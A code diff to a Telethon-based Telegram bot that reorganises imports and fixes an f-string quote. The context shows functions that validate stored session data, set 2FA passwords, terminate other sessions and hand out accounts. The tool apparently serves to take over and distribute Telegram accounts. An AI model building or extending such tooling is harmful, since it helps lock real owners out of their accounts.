@@ -57,7 +57,10 @@ from telethon.errors import (
     PhoneNumberBannedError,
     PasswordHashInvalidError
 )
-
+from telethon.errors import PasswordHashInvalidError
+from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
+from telethon.tl.types import account
+from telethon.tl.functions.auth import ResetAuthorizationsRequest
 
 API_ID = Config.API_ID
 API_HASH = Config.API_HASH
@@ -100,13 +103,6 @@ async def check_2fa(client):
     except Exception as e:
         return f"2FA: Unknown ({e})"
 
-from telethon.errors import PasswordHashInvalidError
-
-from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
-from telethon.tl.types import account
-from telethon.errors import PasswordHashInvalidError
-
-from telethon.errors import PasswordHashInvalidError
 
 async def add_2fa(client, new_password: str, message):
     try:
@@ -201,10 +197,6 @@ async def show_zip_structure(zip_path, message, client):
     except Exception as e:
         await message.reply(f"⚠️ Failed to read zip structure: {e}")
 
-
-
-
-from telethon.tl.functions.auth import ResetAuthorizationsRequest
 
 async def terminate_all_other_sessions(client):
     try:
@@ -626,7 +618,7 @@ async def retrieve_account(client, message):
     valid, me, session = await check_valid_session(doc["tdata"], message)
     status = "✅ Valid" if valid else "❌ Invalid"
     show_2fa = (user_id not in ADMINS) or str(doc.get("by", "")).endswith(f"({user_id})")
-    twofa_text = doc["twofa"] if show_2fa else f"🔒 Hidden\n By{doc.get("by")}"
+    twofa_text = doc["twofa"] if show_2fa else f"🔒 Hidden\nBy {doc.get('by')}"
     text = (
         f"📂 Account Info\n"
         f"Account #: {acc_num}\n"
